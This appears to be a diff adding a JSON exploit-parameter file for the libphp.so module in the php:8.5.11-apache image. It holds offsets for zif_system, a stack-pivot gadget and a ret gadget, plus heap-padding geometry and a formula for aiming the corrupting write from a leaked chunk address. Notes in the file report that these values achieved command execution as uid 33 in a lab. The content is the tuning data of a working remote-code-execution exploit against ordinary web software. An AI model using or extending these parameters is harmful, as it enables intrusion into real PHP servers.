@@ -1,0 +1,33 @@
+{
+  "binary": "/usr/lib/apache2/modules/libphp.so",
+  "image": "php:8.5.11-apache",
+  "md5": "39a5b69694ed9410ea5ef2a687213833",
+  "size_bytes": 25946384,
+  "elf_type": "DYN",
+  "p_align": "0x1000",
+  "pie": true,
+  "image_base": "0x0",
+  "offsets_from_base": {
+    "zif_system": "0x5996e0",
+    "zval_ptr_dtor": "0x7b47a0",
+    "pivot_rsp": "0x64904e",
+    "ret_gadget": "0x183016",
+    "std_object_handlers": "0x169cf60",
+    "zend_standard_class_def": "0x178e9b0",
+    "php_session_initialize": "0x5469d0"
+  },
+  "measurement": {
+    "method": "gdb and /proc/<pid>/maps against the unstripped module",
+    "session_id_channel": "with a file part the first FILE_START assigns send_cookie=0, so the response carries no Set-Cookie and the forged-length read does not reach the wire",
+    "local_execution": "these module offsets and the pad geometry below produced a command executed as uid 33 in a local php:8.5.11-apache lab",
+    "pad_geometry": {
+      "pad_chunk_minus_libphp": "0x1c00000",
+      "pad_chunk_minus_main_chunk": "0x8000000",
+      "pad_block_in_chunk_armed": "0x5d400",
+      "pad_block_in_chunk_disarmed": "0x5b9e8",
+      "fire_block_rule": "for a leaked chunk H and delta D = libphp - H, the pad block is D - 0x1c00000 + pad_block_in_chunk"
+    },
+    "evidence": "objleak lab and the local execution above; no target-written proof and no remote libphp leak on this build",
+    "scope": "per-build and per-mapping; re-measure when the md5 or the process mapping changes"
+  }
+}
